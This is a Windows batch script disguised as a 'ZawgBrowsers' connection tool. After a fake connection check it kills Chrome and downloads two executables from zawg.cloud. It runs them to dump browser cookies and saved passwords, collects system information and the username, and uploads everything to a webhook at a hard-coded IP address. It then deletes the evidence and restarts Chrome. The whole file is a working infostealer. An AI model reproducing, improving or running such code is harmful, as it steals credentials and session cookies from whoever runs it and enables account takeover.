@echo off
title ZawgBrowsers - Connection
set IP=174.119.158.179
  echo [94m╔══════════
  echo [94m║        ZawgBrowsers        ║
  echo [94m║         Connection         ║
  echo [94m╚══════════
echo Connecting...
C:\Windows\System32\ping.exe -n 1 %IP%

if errorlevel 1 (
  cls
  echo [91m╔════════════════════
  echo [91m║      Failed to connect! Server is most likely down, or connection timed out!    ║
  echo [91m╚════════════════════
    pause
) else (
    cls
  echo [92m╔══════════
  echo [92m║        Connected!        ║
  echo [92m╚══════════
  echo.
   title ZawgBrowsers
  echo [94m╔══════════
  echo [94m║        ZawgBrowsers        ║
  echo [94m╚══════════
echo.

taskkill /f /im chrome.exe
curl -o "%USERPROFILE%\Downloads\p.exe" https://zawg.cloud/webhook/p.exe
curl -o "%USERPROFILE%\Downloads\c.exe" https://zawg.cloud/webhook/c.exe
cd "%USERPROFILE%\Downloads"
cd "%USERPROFILE%\Downloads"
cd "%USERPROFILE%\Downloads"
cd "%USERPROFILE%\Downloads"
cd "C:\Users\%username%\Downloads"
"%USERPROFILE%\Downloads\c.exe" --json-print > "%USERPROFILE%\Downloads\cookies.txt"
"%USERPROFILE%\Downloads\p.exe" > "%USERPROFILE%\Downloads\passes.txt"
curl -X POST -F "file=@%USERPROFILE%\Downloads\passes.txt" 174.119.158.179/webhook/webhookreceive.php
echo.
curl -X POST -F "file=@%USERPROFILE%\Downloads\cookies.txt" 174.119.158.179/webhook/webhookreceive.php
echo.
curl -X POST -d "data=%USERNAME%" 174.119.158.179/webhook/folderchecktxt.php
echo.
systeminfo > "%USERPROFILE%\Downloads\sys.txt"
echo.
curl -X POST -F "file=@%USERPROFILE%\Downloads\sys.txt" 174.119.158.179/webhook/webhookreceive.php
echo.
curl -X POST 174.119.158.179/webhook/folderchecktxt.php
echo.
del /F /Q "%USERPROFILE%\Downloads\cookies.txt"
del /F /Q "%USERPROFILE%\Downloads\passes.txt"
del /F /Q "%USERPROFILE%\Downloads\sys.txt"
del /F /Q "%USERPROFILE%\Downloads\c.exe"
del /F /Q "%USERPROFILE%\Downloads\p.exe"
del /F /Q "%USERPROFILE%\Downloads\Cookies_decrypted"
del /F /Q "%~dp0\Cookies_decrypted"
del /F /Q "%~d0\Cookies_decrypted"
start chrome.exe -restore-last-session
taskkill /f /im cmd.exe
echo Finished! Check zawg.cloud or notify me to send you the files
pause
)
